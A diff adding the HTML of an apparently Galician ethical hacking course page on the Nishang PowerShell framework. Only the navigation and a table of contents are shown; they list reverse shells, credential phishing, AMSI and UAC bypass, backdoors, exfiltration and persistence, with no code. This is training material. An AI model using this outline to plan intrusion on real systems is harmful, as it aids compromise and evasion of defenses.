@@ -1,0 +1,3502 @@
+
+<!doctype html>
+<html lang="gl" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../powershell_bypass/">
+      
+      
+        <link rel="next" href="../../../practicas-taller/doc-vulnyx-pivoting-war-basic/">
+      
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.22">
+    
+    
+      
+        <title>Nishang - Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.84d31ad4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../css/custom.css">
+    
+      <link rel="stylesheet" href="../../../../css/opera.css">
+    
+      <link rel="stylesheet" href="../../../../css/print.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#nishang-powershell-framework-para-pentesting" class="md-skip">
+          Ir ao contido
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Cabeceira">
+    <a href="../../../.." title="Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos" class="md-header__button md-logo" aria-label="Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Nishang
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Cambiar a modo oscuro"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Cambiar a modo oscuro" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="indigo"  aria-label="Cambiar a modo normal"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Cambiar a modo normal" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Procura" placeholder="Procura" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Procurar">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Limpar" aria-label="Limpar" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Inicializando procura
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Pestanas" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  De interese
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../consideracions/" class="md-tabs__link">
+          
+  
+  
+  Apuntamentos
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../practicas-taller/doc-vulnyx-pivoting-war-basic/" class="md-tabs__link">
+          
+  
+  
+  Prácticas Taller UD3
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navegación" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos" class="md-nav__button md-logo" aria-label="Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Hacking Ético - UD3 - Consolidación e utilización de sistemas comprometidos
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    De interese
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    Apuntamentos
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Apuntamentos
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../consideracions/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Consideracións
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Tips
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Tips
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_1" id="__nav_2_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Pivoting
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Pivoting
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../proxychains_pivoting_doc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Proxychains e SOCKS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_2" id="__nav_2_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    GNU/Linux
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            GNU/Linux
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../restauracion-tty-linux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    TTY non interactiva
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../rlwrap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    rlwrap
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../uids-syscalls-wrappers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    UIDs, Syscalls e Wrappers de Persistencia
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_3" id="__nav_2_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Windows
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Windows
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../referencias/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Referencias
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ataques-kerberos/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Ataques Kerberos
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../desactivar-windows-defender/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Desactivar Windows Defender
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../powershell_bypass/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Powershell Bypass
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Nishang
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    Nishang
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Táboa de contidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Táboa de contidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#descricion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Descrición
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#instalacion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Instalación
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Instalación">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#desde-github" class="md-nav__link">
+    <span class="md-ellipsis">
+      Desde GitHub
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#estrutura-de-directorios" class="md-nav__link">
+    <span class="md-ellipsis">
+      Estrutura de Directorios
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#modulos-principais" class="md-nav__link">
+    <span class="md-ellipsis">
+      Módulos Principais
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Módulos Principais">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-shells" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Shells
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1. Shells">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#como-funciona-a-carga-en-memoria" class="md-nav__link">
+    <span class="md-ellipsis">
+      Como funciona a carga en memoria
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#invoke-powershelltcp-reverse-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Invoke-PowerShellTcp (Reverse Shell)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#invoke-powershelltcponeline" class="md-nav__link">
+    <span class="md-ellipsis">
+      Invoke-PowerShellTcpOneLine
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-gather-recoleccion-de-informacion" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Gather (Recolección de Información)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. Gather (Recolección de Información)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#get-information" class="md-nav__link">
+    <span class="md-ellipsis">
+      Get-Information
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#get-wlan-keys" class="md-nav__link">
+    <span class="md-ellipsis">
+      Get-WLAN-Keys
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#invoke-credentialsphish" class="md-nav__link">
+    <span class="md-ellipsis">
+      Invoke-CredentialsPhish
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-escalation-escalada-de-privilexios" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Escalation (Escalada de Privilexios)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. Escalation (Escalada de Privilexios)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#invoke-psuacme" class="md-nav__link">
+    <span class="md-ellipsis">
+      Invoke-PsUACme
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#enable-duplicatetoken" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enable-DuplicateToken
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-execution-execucion" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. Execution (Execución)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. Execution (Execución)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#invoke-encode" class="md-nav__link">
+    <span class="md-ellipsis">
+      Invoke-Encode
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#download-execute-ps" class="md-nav__link">
+    <span class="md-ellipsis">
+      Download-Execute-PS
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-bypass-evasion" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. Bypass (Evasión)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. Bypass (Evasión)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#invoke-amsibypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      Invoke-AmsiBypass
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6-backdoors" class="md-nav__link">
+    <span class="md-ellipsis">
+      6. Backdoors
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6. Backdoors">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#http-backdoor" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP-Backdoor
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dns_txt_pwnage" class="md-nav__link">
+    <span class="md-ellipsis">
+      DNS_TXT_Pwnage
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#7-client-lado-do-cliente" class="md-nav__link">
+    <span class="md-ellipsis">
+      7. Client (Lado do Cliente)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="7. Client (Lado do Cliente)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#out-chm" class="md-nav__link">
+    <span class="md-ellipsis">
+      Out-CHM
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#out-word" class="md-nav__link">
+    <span class="md-ellipsis">
+      Out-Word
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#8-pivot" class="md-nav__link">
+    <span class="md-ellipsis">
+      8. Pivot
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="8. Pivot">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#invoke-networkrelay" class="md-nav__link">
+    <span class="md-ellipsis">
+      Invoke-NetworkRelay
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exemplos-practicos-completos" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exemplos Prácticos Completos
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exemplos Prácticos Completos">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#escenario-1-shells-reversas-e-bind" class="md-nav__link">
+    <span class="md-ellipsis">
+      Escenario 1: Shells Reversas e Bind
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Escenario 1: Shells Reversas e Bind">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#opcion-a-reverse-shell-tcp-invoke-powershelltcp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción A: Reverse Shell TCP (Invoke-PowerShellTcp)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-b-reverse-shell-oneline-recomendado-mais-estable" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción B: Reverse Shell OneLine (RECOMENDADO - Máis estable)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-c-bind-shell-tcp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción C: Bind Shell TCP
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-d-reverse-shell-udp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción D: Reverse Shell UDP
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-e-icmp-shell-icmpsh-avanzado-e-limitado" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción E: ICMP Shell (icmpsh) - AVANZADO E LIMITADO
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#comparacion-de-shells" class="md-nav__link">
+    <span class="md-ellipsis">
+      Comparación de Shells
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#escenario-2-recoleccion-de-informacion-exfiltracion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Escenario 2: Recolección de Información + Exfiltración
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Escenario 2: Recolección de Información + Exfiltración">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#metodo-en-memoria-recomendado" class="md-nav__link">
+    <span class="md-ellipsis">
+      Método en Memoria (Recomendado)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#escenario-3-bypass-uac-escalada-de-privilexios" class="md-nav__link">
+    <span class="md-ellipsis">
+      Escenario 3: Bypass UAC + Escalada de Privilexios
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Escenario 3: Bypass UAC + Escalada de Privilexios">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#secuencia-completa-en-memoria" class="md-nav__link">
+    <span class="md-ellipsis">
+      Secuencia Completa en Memoria
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#verificar-privilexios" class="md-nav__link">
+    <span class="md-ellipsis">
+      Verificar Privilexios
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#metodos-alternativos-de-uac-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      Métodos Alternativos de UAC Bypass
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#escenario-4-persistencia" class="md-nav__link">
+    <span class="md-ellipsis">
+      Escenario 4: Persistencia
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Escenario 4: Persistencia">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#opcion-a-backdoor-en-screensaver-en-memoria" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción A: Backdoor en Screensaver (En Memoria)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-b-http-backdoor-polling-periodico" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción B: HTTP Backdoor (Polling Periódico)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-c-tarea-programada-desde-ficheiro-local" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción C: Tarea Programada (Desde ficheiro local)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-d-dns-txt-backdoor-sigiloso" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción D: DNS TXT Backdoor (Sigiloso)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tecnicas-de-entrega" class="md-nav__link">
+    <span class="md-ellipsis">
+      Técnicas de Entrega
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Técnicas de Entrega">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#via-hta-html-application" class="md-nav__link">
